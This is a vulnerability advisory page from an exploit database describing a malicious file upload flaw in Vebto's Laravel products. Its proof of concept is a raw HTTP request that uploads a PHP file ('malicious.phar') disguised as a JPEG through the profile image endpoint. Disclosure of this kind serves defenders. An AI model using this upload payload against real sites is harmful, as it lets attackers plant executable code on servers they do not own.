---
title: LARAVEL VEBTO MULTIPLE FILE UPLOAD
url: https://cxsecurity.com/issue/WLB-2023030045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-20
fetch_date: 2025-10-04T10:04:32.590085
---

# LARAVEL VEBTO MULTIPLE FILE UPLOAD

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LARAVEL VEBTO MULTIPLE FILE UPLOAD** **2023.03.19**  **![id](https://cert.cx/cxstatic/images/flags/id.png) [Khunerable](https://cxsecurity.com/author/Khunerable/1/) **(ID)** ![id](https://cert.cx/cxstatic/images/flags/id.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: LARAVEL VEBTO MULTIPLE FILE UPLOAD
# Description: THE ALL PRODUCT FROM VEBTO IS VULNERABLE TO UPLOAD THE MALICIOUS FILE
# Date: 20210503
# Exploit Author: Khunerable
# Vendor Homepage: https://codecanyon.net/user/vebto/portfolio
# Tested on: Windows 11,Windows NT 10.0
POC :
===================================
register the user, go to edit profile and follow the step
===================================
POST /secure/uploads/images HTTP/2
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: localhost
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
-----------------------------338660485121055751091161261824
Content-Disposition: form-data; name="diskPrefix"
/
-----------------------------338660485121055751091161261824
Content-Disposition: form-data; name="file"; filename="malicious.phar"
Content-Type: image/jpeg
ÿØÿà<?php malicious();?>
-----------------------------338660485121055751091161261824
===================================
then the file will uploaded localhost/storage/malicious.phar

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030045)

[Tweet](https://twitter.com/share)

Vote for this issue:
 4
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top